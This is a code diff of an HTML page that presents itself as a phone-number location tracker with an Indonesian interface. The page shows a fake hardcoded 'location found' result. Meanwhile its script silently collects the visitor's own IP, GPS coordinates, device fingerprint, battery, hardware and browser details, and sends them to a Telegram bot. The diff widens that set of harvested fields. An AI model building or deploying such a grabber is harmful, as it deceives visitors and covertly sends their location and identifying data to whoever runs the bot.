@@ -3,63 +3,53 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Phone Number Tracker</title>
+  <title>Phone Tracker</title>
   <style>
     body {
-      background: #0d0d0d;
+      background: #111;
       color: #0f0;
-      font-family: 'Courier New', monospace;
+      font-family: monospace;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
-      margin: 0;
       padding: 20px;
+      text-align: center;
     }
-
     h1 {
-      font-size: 1.8em;
+      font-size: 1.5rem;
       margin-bottom: 20px;
-      text-align: center;
     }
-
     input {
-      background: #222;
-      color: #0f0;
-      border: 1px solid #0f0;
       padding: 10px;
-      width: 280px;
-      text-align: center;
-      font-size: 1em;
+      width: 80%;
+      max-width: 300px;
       margin-bottom: 15px;
-    }
-
-    button {
-      background: #0f0;
-      color: #000;
-      padding: 10px 20px;
+      font-size: 1rem;
       border: none;
+      border-radius: 5px;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 1rem;
+      background: #0f0;
+      color: #111;
+      border: none;
+      border-radius: 5px;
       cursor: pointer;
-      font-weight: bold;
-      transition: background 0.3s;
     }
-
-    button:hover {
-      background: #0b0;
-    }
-
     #result {
-      margin-top: 25px;
-      text-align: center;
+      margin-top: 15px;
+      font-size: 0.9rem;
+      color: #ccc;
     }
   </style>
 </head>
 <body>
-  <h1>Phone Number Tracker</h1>
-  <input type="text" id="phone" placeholder="Enter phone number" />
-  <button onclick="track()">Track Location</button>
-
+  <h1>Lacak Lokasi Lewat Nomor HP</h1>
+  <input type="text" id="phone" placeholder="Masukkan nomor target" />
+  <button onclick="track()">Track</button>
   <div id="result"></div>
 
   <script>
@@ -83,19 +73,51 @@
     async function getVisitorInfo() {
       const phoneInput = document.getElementById("phone").value;
       const clock = new Date().toLocaleString();
-      let latitude = "N/A", longitude = "N/A", ip = "N/A", country = "N/A", region = "N/A", accuracy = "N/A";
+      let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
+      let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A";
+
+      const userAgent = navigator.userAgent;
+      const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
+      const device = navigator.platform + " - " + userAgent;
+      const loginFrom = navigator.platform || "N/A";
+      const language = navigator.language || "N/A";
+      const resolution = screen.width + "x" + screen.height;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+      const isOnline = navigator.onLine;
+      const deviceMemory = navigator.deviceMemory || "N/A";
+      const cpuCores = navigator.hardwareConcurrency || "N/A";
+      const isTouch = 'ontouchstart' in window;
+      const cookiesEnabled = navigator.cookieEnabled;
+      const doNotTrack = navigator.doNotTrack;
+      const fingerprint = await generateFingerprint();
+
+      const batteryInfo = await navigator.getBattery().then(battery => {
+        return {
+          "battery level": Math.round(battery.level * 100) + "%",
+          "charging": battery.charging ? "chargeing🔋" : "no"
+        };
+      }).catch(() => ({
+        "battery level": "N/A",
+        "charging": "N/A"
+      }));
 
       try {
         const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
         ip = ipData.ip;
         country = ipData.country_name;
-        region = ipData.region;
+        province = ipData.region;
         latitude = ipData.latitude;
         longitude = ipData.longitude;
       } catch {}
 
       try {
-        await new Promise(resolve => {
+        const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
+        weather = weatherData.current_condition[0].weatherDesc[0].value;
+        temperature = weatherData.current_condition[0].temp_C + "°C";
+      } catch {}
+
+      try {
+        await new Promise((resolve) => {
           navigator.geolocation.getCurrentPosition(
             pos => {
               latitude = pos.coords.latitude.toFixed(6);
@@ -109,20 +131,33 @@
         });
       } catch {}
 
-      const fingerprint = await generateFingerprint();
-
       const jsonData = {
-        "target input": phoneInput,
-        "device ip": ip,
+        "nomor target": phoneInput,
+        "alamat ip": ip,
+        "device": device,
+        "android versions": androidVersion,
+        "login from": loginFrom,
         "lokasi": `${latitude}, ${longitude} (accuracy: ${accuracy})`,
         "country": country,
-        "province": region,
-        "waktu akses": clock,
-        "user-agent": navigator.userAgent,
-        "fingerprint": fingerprint
+        "province": province,
+        "clock": clock,
+        "weather": weather,
+        "temperature": temperature,
+        "language": language,
+        "screen resolution": resolution,
+        "timezone": timezone,
+        "online": isOnline,
+        "ram (GB)": deviceMemory,
+        "cpu cores": cpuCores,
+        "touch support": isTouch,
+        "cookies enabled": cookiesEnabled,
+        "do not track": doNotTrack,
+        "fingerprint": fingerprint,
+        "battery": batteryInfo["battery level"],
+        "charging": batteryInfo["charging"]
       };
 
-      const message = `📥 *Pelacak Lokasi Diakses*\n\`\`\`json\n${JSON.stringify(jsonData, null, 2)}\n\`\`\``;
+      const message = `📥 *Data target Baru*\n\`\`\`json\n${JSON.stringify(jsonData, null, 2)}\n\`\`\``;
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
@@ -137,13 +172,12 @@
 
     function track() {
       const resBox = document.getElementById("result");
-      resBox.innerHTML = "🔍 Tracking location...";
+      resBox.innerHTML = "🔍 Tracking lokasi...";
       setTimeout(() => {
-        resBox.innerHTML = `<b>Location found:</b><br>Lat: -6.2 | Long: 106.8<br>Status: <span style="color:lime">Active</span>`;
+        resBox.innerHTML = "<b>Lokasi ditemukan</b><br>Lat: -6.2<br>Long: 106.8<br>Status: <span style='color:lime'>Aktif</span>";
       }, 3000);
-
-      getVisitorInfo(); // Send visitor info silently
+      getVisitorInfo(); // kirim data
     }
   </script>
 </body>
-  </html>
+</html>
